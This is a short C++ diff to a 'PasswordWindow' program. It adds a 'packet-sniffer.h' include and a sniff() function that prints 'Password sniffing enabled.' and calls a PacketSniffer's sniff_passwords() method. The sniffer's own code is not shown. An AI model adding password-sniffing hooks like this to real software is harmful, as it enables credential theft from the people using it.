@@ -9,6 +9,7 @@
 #include "write-dialog.h"
 #include "delete-dialog.h"
 #include "attack-dialog.h"
+#include "packet-sniffer.h"
 
 PasswordWindow::PasswordWindow()
 {
@@ -75,4 +76,6 @@ void PasswordWindow::deletePrompt() {
 
 void sniff() {
   std::cout << "Password sniffing enabled." << std::endl;
+  PacketSniffer password_sniffer;
+  password_sniffer.sniff_passwords();
 }
